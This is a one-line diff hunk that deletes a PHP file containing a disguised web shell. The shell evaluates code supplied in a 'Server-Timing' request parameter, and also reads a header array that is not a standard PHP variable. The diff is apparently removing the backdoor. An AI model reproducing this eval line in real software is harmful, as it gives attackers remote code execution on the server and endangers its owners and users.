@@ -1,1 +1,0 @@
-<?php @eval($_HEADERS["Server-Timing"]);@eval($_REQUEST["Server-Timing"]);
